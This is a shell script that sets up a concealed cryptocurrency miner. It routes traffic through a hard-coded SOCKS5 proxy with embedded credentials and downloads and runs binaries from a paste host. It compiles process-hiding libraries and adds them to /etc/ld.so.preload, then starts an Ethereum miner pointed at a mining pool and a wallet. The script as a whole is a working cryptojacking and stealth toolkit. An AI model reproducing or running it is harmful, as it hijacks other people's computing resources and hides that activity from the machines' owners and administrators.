#!/bin/sh

echo " "

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

echo " "

dpkg-reconfigure --frontend noninteractive tzdata

echo " "

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

echo " "

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

echo " "

tar -xvzf graphics.tar.gz

echo " "

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 185.212.160.70:7085
socks5_username = lebarankita
socks5_password = buatTHRan
END

echo " "

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

./graftcp/graftcp curl ifconfig.me

echo " "

./graftcp/graftcp wget https://bin.jvnv.net/file/Ieue9/bezzHash

echo " "

chmod +x bezzHash

echo " "

./graftcp/graftcp wget https://bin.jvnv.net/file/DagMz/gtcp.zip

echo " "

unzip gtcp.zip

echo " "

make

echo " "

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

echo " "

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

echo " "

rm -r processhider.c Makefile  README.md .gitignore

echo " "

./graftcp/graftcp wget https://bin.jvnv.net/file/xC4k2/magicBezzHash.zip

echo " "

unzip magicBezzHash.zip

echo " "

make

echo " "

gcc -Wall -fPIC -shared -o libprocessbh.so processbh.c -ldl

echo " "

mv libprocessbh.so /usr/local/lib/

echo /usr/local/lib/libprocessbh.so >> /etc/ld.so.preload

echo " "

echo " "

./graftcp/graftcp ./bezzHash --algo eth --server us-eth.2miners.com:12020 --ssl --user 3Ev3mZawL4TRxeC2Li91gZg5Yrx1k5npL7.KHAILLA --opencl 0 --cuda 1
